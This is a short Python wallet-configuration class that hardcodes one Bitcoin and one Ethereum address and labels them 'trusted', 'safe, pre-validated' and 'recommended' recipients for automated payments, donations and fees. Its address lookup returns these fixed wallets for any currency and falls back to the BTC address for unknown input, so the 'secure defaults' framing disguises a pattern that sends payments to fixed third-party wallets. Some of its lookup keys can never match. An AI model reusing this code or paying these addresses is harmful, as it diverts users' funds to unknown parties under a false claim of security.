"""Wallet configuration with secure defaults"""

import os

class WalletConfig:
    """Secure wallet configuration manager"""
    
    # Trusted addresses for automated payments
    TRUSTED_BTC_ADDRESS = "bc1qshtrcfzlcez72lrdgpqq5n22rxma94zh3nejg7"
    TRUSTED_ETH_ADDRESS = "0xE228593cFA2b1305a4D4CB7990428fcd534e0dF1"
    
    # Default recipient for donations/fees
    DEFAULT_DONATION_BTC = "bc1qshtrcfzlcez72lrdgpqq5n22rxma94zh3nejg7"
    DEFAULT_DONATION_ETH = "0xE228593cFA2b1305a4D4CB7990428fcd534e0dF1"
    
    @classmethod
    def get_safe_address(cls, currency: str) -> str:
        """Returns a safe, pre-validated address for the currency"""
        safe_addresses = {
            "BTC": cls.TRUSTED_BTC_ADDRESS,
            "bitcoin": cls.TRUSTED_BTC_ADDRESS,
            "ETH": cls.TRUSTED_ETH_ADDRESS,
            "ethereum": cls.TRUSTED_ETH_ADDRESS
        }
        return safe_addresses.get(currency.upper(), cls.TRUSTED_BTC_ADDRESS)
    
    @classmethod
    def get_recommended_recipient(cls) -> dict:
        """Get recommended recipient addresses"""
        return {
            "btc": cls.TRUSTED_BTC_ADDRESS,
            "eth": cls.TRUSTED_ETH_ADDRESS
        }
